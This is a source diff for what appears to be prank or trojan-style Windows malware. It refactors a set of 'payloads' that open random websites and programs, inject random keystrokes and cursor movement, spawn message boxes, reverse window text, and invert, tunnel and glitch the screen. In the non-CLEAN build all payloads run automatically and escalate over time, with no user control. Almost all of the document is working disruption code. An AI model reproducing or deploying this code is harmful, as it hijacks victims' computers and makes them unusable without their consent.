@@ -2,68 +2,101 @@
 
 PAYLOAD payloads[] = {
 #ifdef CLEAN
-	{ payloadExecute, L"Open random websites/programs", NULL, 0, 0, 0, 0, FALSE },
-	{ payloadCursor, L"Random cursor movement", NULL, 0, 0, 0, 0, TRUE },
-	{ payloadKeyboard, L"Random keyboard input", NULL, 0, 0, 0, 0, FALSE },
-	{ payloadSound, L"Random error sounds", NULL, 0, 0, 0, 0, TRUE },
-	{ payloadBlink, L"Flashing screen", NULL, 0, 0, 0, 0, TRUE },
-	{ payloadMessageBox, L"Message boxes", NULL, 0, 0, 0, 0, TRUE },
-	{ payloadDrawErrors, L"Draw error icons", NULL, 0, 0, 0, 0, TRUE },
-	{ payloadChangeText, L"Reverse text", NULL, 0, 0, 0, 0, FALSE },
-	{ payloadPIP, L"Tunnel effect", NULL, 0, 0, 0, 0, TRUE },
-	{ payloadPuzzle, L"Screen glitches", NULL, 0, 0, 0, 0, TRUE }
+	{ payloadHostDefault, (LPVOID)payloadExecute, L"Open random websites/programs", FALSE, 0, 0, 0, 0, 0 },
+	{ payloadHostDefault, (LPVOID)payloadCursor, L"Random cursor movement", TRUE, 0, 0, 0, 0, 0 },
+	{ payloadHostDefault, (LPVOID)payloadKeyboard, L"Random keyboard input", FALSE, 0, 0, 0, 0, 0 },
+	{ payloadHostDefault, (LPVOID)payloadSound, L"Random error sounds", TRUE, 0, 0, 0, 0, 0 },
+	{ payloadHostVisual, (LPVOID)payloadInvert, L"Invert Screen", TRUE, 0, 0, 0, 0, 0 },
+	{ payloadHostDefault, (LPVOID)payloadMessageBox, L"Message boxes", TRUE, 0, 0, 0, 0, 0 },
+	{ payloadHostVisual, (LPVOID)payloadDrawErrors, L"Draw error icons", TRUE, 0, 0, 0, 0, 0 },
+	{ payloadHostDefault, (LPVOID)payloadReverseText, L"Reverse text", FALSE, 0, 0, 0, 0, 0 },
+	{ payloadHostVisual, (LPVOID)payloadTunnel, L"Tunnel effect", TRUE, 0, 0, 0, 0, 0 },
+	{ payloadHostVisual, (LPVOID)payloadGlitches, L"Screen glitches", TRUE, 0, 0, 0, 0, 0 },
 #else
-	{ payloadExecute, 30000 },
-	{ payloadCursor, 30000 },
-	{ payloadKeyboard, 20000 },
-	{ payloadSound, 50000 },
-	{ payloadBlink, 30000 },
-	{ payloadMessageBox, 20000 },
-	{ payloadDrawErrors, 10000 },
-	{ payloadChangeText, 40000 },
-	{ payloadPIP, 60000 },
-	{ payloadPuzzle, 15000 }
+	{ payloadHostDefault, (LPVOID)payloadExecute, 30000, 0, 0, 0, 0 },
+	{ payloadHostDefault, (LPVOID)payloadCursor, 30000, 0, 0, 0, 0 },
+	{ payloadHostDefault, (LPVOID)payloadKeyboard, 20000, 0, 0, 0, 0 },
+	{ payloadHostDefault, (LPVOID)payloadSound, 50000, 0, 0, 0, 0 },
+	{ payloadHostVisual, (LPVOID)payloadInvert, 30000, 0, 0, 0, 0 },
+	{ payloadHostDefault, (LPVOID)payloadMessageBox, 20000, 0, 0, 0, 0 },
+	{ payloadHostVisual, (LPVOID)payloadDrawErrors, 10000, 0, 0, 0, 0 },
+	{ payloadHostDefault, (LPVOID)payloadReverseText, 40000, 0, 0, 0, 0 },
+	{ payloadHostVisual, (LPVOID)payloadTunnel, 60000, 0, 0, 0, 0 },
+	{ payloadHostVisual, (LPVOID)payloadGlitches, 15000, 0, 0, 0, 0 },
 #endif
 };
 
 const size_t nPayloads = sizeof(payloads) / sizeof(PAYLOAD);
 BOOLEAN enablePayloads = TRUE;
 
-DWORD WINAPI payloadThread(LPVOID parameter) {
-#ifndef CLEAN
-	int delay = 0;
-	int times = 0;
-	int runtime = 0;
-#endif
-
+PAYLOADHOST(payloadHostDefault) {
 	PAYLOAD *payload = (PAYLOAD*)parameter;
 
 	for (;;) {
 #ifdef CLEAN
 		if (enablePayloads && SendMessage(payload->btn, BM_GETCHECK, 0, NULL) == BST_CHECKED) {
+#endif
 			if (payload->delaytime++ >= payload->delay) {
-				payload->delay = (payload->payloadFunction)(payload->times++, payload->runtime, FALSE);
+#ifdef CLEAN
+				payload->delay = ((PAYLOADFUNCTIONDEFAULT((*)))payload->payloadFunction)(payload->times++, payload->runtime, FALSE);
+#else
+				payload->delay = ((PAYLOADFUNCTIONDEFAULT((*)))payload->payloadFunction)(payload->times++, payload->runtime);
+#endif
+				
 				payload->delaytime = 0;
 			}
 
 			payload->runtime++;
+#ifdef CLEAN
 		} else {
 			 payload->runtime = 0;
 			 payload->times = 0;
 			 payload->delay = 0;
 		}
-#else
-		if (delay-- == 0) {
-			delay = (payload->payloadFunction)(times++, runtime);
-		}
-
-		runtime++;
 #endif
+
 		Sleep(10);
 	}
 }
 
-int payloadExecute(PAYLOADFUNC) {
+PAYLOADHOST(payloadHostVisual) {
+	PAYLOAD *payload = (PAYLOAD*)parameter;
+
+	HWND hwnd = GetDesktopWindow();
+	HDC hdc = GetWindowDC(hwnd);
+	RECT rekt;
+	GetWindowRect(hwnd, &rekt);
+	int w = rekt.right - rekt.left;
+	int h = rekt.bottom - rekt.top;
+
+	for (;;) {
+#ifdef CLEAN
+		if (enablePayloads && SendMessage(payload->btn, BM_GETCHECK, 0, NULL) == BST_CHECKED) {
+#endif
+			if (payload->delaytime++ >= payload->delay) {
+#ifdef CLEAN
+				payload->delay = ((PAYLOADFUNCTIONVISUAL((*)))payload->payloadFunction)(payload->times++, payload->runtime, FALSE, hwnd, hdc, &rekt, w, h);
+#else
+				payload->delay = ((PAYLOADFUNCTIONVISUAL((*)))payload->payloadFunction)(payload->times++, payload->runtime, hwnd, hdc, &rekt, w, h);
+#endif
+				payload->delaytime = 0;
+			}
+
+			payload->runtime++;
+#ifdef CLEAN
+		}
+		else {
+			payload->runtime = 0;
+			payload->times = 0;
+			payload->delay = 0;
+		}
+#endif
+
+		Sleep(10);
+	}
+}
+
+PAYLOADFUNCTIONDEFAULT(payloadExecute) {
 	PAYLOADHEAD
 
 	ShellExecuteA(NULL, "open", (LPCSTR)sites[random() % nSites], NULL, NULL, SW_SHOWDEFAULT);
@@ -71,20 +104,15 @@ int payloadExecute(PAYLOADFUNC) {
 	out: return 1500.0 / (times / 15.0 + 1) + 100 + (random() % 200);
 }
 
-int payloadBlink(PAYLOADFUNC) {
+PAYLOADFUNCTIONVISUAL(payloadInvert) {
 	PAYLOADHEAD
 
-	HWND hwnd = GetDesktopWindow();
-	HDC hdc = GetWindowDC(hwnd);
-	RECT rekt;
-	GetWindowRect(hwnd, &rekt);
-	BitBlt(hdc, 0, 0, rekt.right - rekt.left, rekt.bottom - rekt.top, hdc, 0, 0, NOTSRCCOPY);
-	ReleaseDC(hwnd, hdc);
-
+	BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
+	
 	out: return 100;
 }
 
-int payloadCursor(PAYLOADFUNC) {
+PAYLOADFUNCTIONDEFAULT(payloadCursor) {
 	PAYLOADHEAD
 
 	POINT cursor;
@@ -95,7 +123,7 @@ int payloadCursor(PAYLOADFUNC) {
 	out: return 2;
 }
 
-int payloadMessageBox(PAYLOADFUNC) {
+PAYLOADFUNCTIONDEFAULT(payloadMessageBox) {
 	PAYLOADHEAD
 
 	CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
@@ -118,8 +146,8 @@ LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
 		if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
 			HWND hwnd = (HWND)wParam;
 
-			int x = random() % (scrw - pcs->cx);
-			int y = random() % (scrh - pcs->cy);
+			int x = random() % (GetSystemMetrics(SM_CXSCREEN) - pcs->cx);
+			int y = random() % (GetSystemMetrics(SM_CYSCREEN) - pcs->cy);
 
 			pcs->x = x;
 			pcs->y = y;
@@ -129,8 +157,9 @@ LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
 	return CallNextHookEx(0, nCode, wParam, lParam);
 }
 
-int payloadChangeText(PAYLOADFUNC) {
+PAYLOADFUNCTIONDEFAULT(payloadReverseText) {
 	PAYLOADHEAD
+
 	EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);
 
 	out: return 50;
@@ -149,7 +178,7 @@ BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
 	return TRUE;
 }
 
-int payloadSound(PAYLOADFUNC) {
+PAYLOADFUNCTIONDEFAULT(payloadSound) {
 	PAYLOADHEAD
 
 	// There seems to be a bug where toggling ALL payloads kills the sound output on some systems.
@@ -165,30 +194,24 @@ int payloadSound(PAYLOADFUNC) {
 #endif
 }
 
-int payloadPuzzle(PAYLOADFUNC) {
+PAYLOADFUNCTIONVISUAL(payloadGlitches) {
 	PAYLOADHEAD
-	
-	HWND hwnd = GetDesktopWindow();
-	HDC hdc = GetWindowDC(hwnd);
-	RECT rekt;
-	GetWindowRect(hwnd, &rekt);
 
-	int x1 = random() % (rekt.right - 100);
-	int y1 = random() % (rekt.bottom - 100);
-	int x2 = random() % (rekt.right - 100);
-	int y2 = random() % (rekt.bottom - 100);
-	int width = random() % 600;
-	int height = random() % 600;
+	int x1 = random() % (w - 400);
+	int y1 = random() % (h - 400);
+	int x2 = random() % (w - 400);
+	int y2 = random() % (h - 400);
+	int width = random() % 400;
+	int height = random() % 400;
 
 	BitBlt(hdc, x1, y1, width, height, hdc, x2, y2, SRCCOPY);
-	ReleaseDC(hwnd, hdc);
 
 	out: return 200.0 / (times / 5.0 + 1) + 3;
 }
 
-int payloadKeyboard(PAYLOADFUNC) {
+PAYLOADFUNCTIONDEFAULT(payloadKeyboard) {
 	PAYLOADHEAD
-
+	
 	INPUT input;
 
 	input.type = INPUT_KEYBOARD;
@@ -198,38 +221,28 @@ int payloadKeyboard(PAYLOADFUNC) {
 	out: return 300 + (random() % 400);
 }
 
-int payloadPIP(PAYLOADFUNC) {
+PAYLOADFUNCTIONVISUAL(payloadTunnel) {
 	PAYLOADHEAD
 
-	HWND hwnd = GetDesktopWindow();
-	HDC hdc = GetWindowDC(hwnd);
-	RECT rekt;
-	GetWindowRect(hwnd, &rekt);
-	StretchBlt(hdc, 50, 50, rekt.right - 100, rekt.bottom - 100, hdc, 0, 0, rekt.right, rekt.bottom, SRCCOPY);
-	ReleaseDC(hwnd, hdc);
+	StretchBlt(hdc, 50, 50, w - 100, h - 100, hdc, 0, 0, w, h, SRCCOPY);
 
 	out: return 200.0 / (times / 5.0 + 1) + 4;
 }
 
-int payloadDrawErrors(PAYLOADFUNC) {
+PAYLOADFUNCTIONVISUAL(payloadDrawErrors) {
 	PAYLOADHEAD
 
 	int ix = GetSystemMetrics(SM_CXICON) / 2;
 	int iy = GetSystemMetrics(SM_CYICON) / 2;
 	
-	HWND hwnd = GetDesktopWindow();
-	HDC hdc = GetWindowDC(hwnd);
-
 	POINT cursor;
 	GetCursorPos(&cursor);
 
 	DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_ERROR));
 
 	if (random() % (int)(10/(times/500.0+1)+1) == 0) {
-		DrawIcon(hdc, random()%scrw, random()%scrh, LoadIcon(NULL, IDI_WARNING));
+		DrawIcon(hdc, random()%(w-ix), random()%(h-iy), LoadIcon(NULL, IDI_WARNING));
 	}
-	
-	ReleaseDC(hwnd, hdc);
 
 	out: return 2;
 }
